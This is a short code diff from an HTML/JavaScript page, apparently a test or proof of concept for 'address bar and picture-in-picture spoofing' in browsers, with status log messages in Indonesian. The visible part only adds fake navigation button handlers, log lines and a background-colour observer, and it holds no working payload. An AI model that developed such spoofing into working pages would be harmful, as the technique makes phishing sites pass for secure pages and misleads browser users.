+function fakeForward() { addLog("▶ Forward button (fake)", ""); }
+function fakeRefresh() { addLog("⟳ Refresh", ""); location.reload(); }
+function fakeMenu() { addLog("⋮ Menu", ""); }
+
 // Initial logs
 detectMacOS();
-addLog("⚡ VECTOR 16 - White Address Bar + PiP Spoofing LOADED", "success");
-addLog("🎨 Address bar color: WHITE (seperti halaman secure)", "success");
-addLog("🖼️ PiP window dengan tema putih bersih - klik 'CREATE WHITE PiP WINDOW'", "");
-addLog("💡 Untuk macOS: warna address bar bisa disesuaikan dengan tema browser", "");
+addLog("⚡ VECTOR 16 - NATIVE PiP + ADDRESS BAR SPOOFING LOADED", "success");
+addLog("📌 NATIVE PiP: Menggunakan API asli macOS (bukan fake window)", "success");
+addLog("🎨 Address bar: Warna otomatis menyesuaikan background page", "");
+addLog("💡 Klik 'ACTIVATE NATIVE macOS PiP' untuk membuka PiP asli", "success");
+
+// Auto-detect address bar color change (CSS-based)
+const observer = new MutationObserver(() => {
+    const bodyBg = getComputedStyle(document.body).backgroundColor;
+    if (bodyBg === "rgb(255, 255, 255)") {
+        addLog("🎨 Address bar akan otomatis menampilkan text HITAM (kontras dengan putih)", "");
+    }
+});
+observer.observe(document.body, { attributes: true, attributeFilter: ['style', 'class'] });
 </script>
 </body>
 </html>
